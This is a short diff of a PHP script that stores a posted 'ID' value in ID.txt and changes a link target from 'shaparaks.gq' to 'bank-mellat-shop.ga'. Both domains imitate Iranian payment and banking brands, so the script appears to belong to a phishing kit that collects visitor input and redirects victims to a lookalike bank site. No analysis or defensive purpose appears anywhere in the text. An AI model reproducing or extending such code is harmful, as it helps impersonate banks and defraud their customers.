@@ -31,7 +31,7 @@ $IDS=intval(stripslashes(htmlspecialchars($_POST["ID"])));
 
 //LINK
 
-$url="https://shaparaks.gq";
+$url="https://bank-mellat-shop.ga";
 
 file_put_contents("ID.txt",$IDS);
  
